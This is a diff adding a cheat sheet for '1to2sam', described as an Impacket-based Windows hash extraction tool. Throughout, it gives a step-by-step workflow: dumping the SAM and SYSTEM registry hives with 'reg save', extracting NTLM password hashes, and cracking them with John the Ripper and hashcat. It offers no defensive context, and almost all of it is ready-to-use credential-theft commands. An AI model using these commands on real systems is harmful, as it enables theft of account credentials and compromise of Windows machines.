@@ -1,0 +1,88 @@
+[X] 1to2sam Command List (Windows Hash Extraction Utility – Impacket)
+
+[\] 1to2sam.py --help
+[/] Show help menu
+
+[\] 1to2sam.py SYSTEM SAM
+[/] Extract NTLM password hashes using SYSTEM + SAM files
+
+[\] 1to2sam.py -o output.txt SYSTEM SAM
+[/] Save extracted hashes to file
+
+[\] 1to2sam.py -v SYSTEM SAM
+[/] Enable verbose output
+
+# -------------------------
+# INPUT FILES
+# -------------------------
+
+[\] SYSTEM
+[/] Windows SYSTEM hive (contains boot key)
+
+[\] SAM
+[/] Security Account Manager database
+
+[\] SECURITY
+[/] (Optional) Additional hive for extended secrets
+
+# -------------------------
+# TYPICAL WORKFLOW
+# -------------------------
+
+[\] reg save HKLM\\SAM sam.save
+[/] Dump SAM hive (requires admin)
+
+[\] reg save HKLM\\SYSTEM system.save
+[/] Dump SYSTEM hive
+
+[\] 1to2sam.py system.save sam.save
+[/] Extract hashes
+
+# -------------------------
+# OUTPUT FORMAT
+# -------------------------
+
+[\] username:RID:LM_hash:NT_hash:::
+[/] Standard hash output format
+
+# -------------------------
+# INTEGRATION / USAGE
+# -------------------------
+
+[\] 1to2sam.py system.save sam.save > hashes.txt
+[/] Redirect output to file
+
+[\] cat hashes.txt
+[/] View extracted hashes
+
+[\] john hashes.txt
+[/] Crack hashes with John the Ripper
+
+[\] hashcat -m 1000 hashes.txt wordlist.txt
+[/] Crack NTLM hashes with Hashcat
+
+# -------------------------
+# TROUBLESHOOTING
+# -------------------------
+
+[\] sudo python3 1to2sam.py system.save sam.save
+[/] Run with elevated privileges if needed
+
+[\] ls -l system.save sam.save
+[/] Verify input files exist
+
+[\] file system.save
+[/] Confirm correct file type
+
+# -------------------------
+# PIPELINE EXAMPLES
+# -------------------------
+
+[\] reg save HKLM\\SAM sam.save → reg save HKLM\\SYSTEM system.save
+[/] Dump registry hives
+
+[\] 1to2sam.py system.save sam.save → john hashes.txt
+[/] Extract and crack hashes
+
+[\] 1to2sam.py system.save sam.save > hashes.txt
+[/] Export hashes for later use
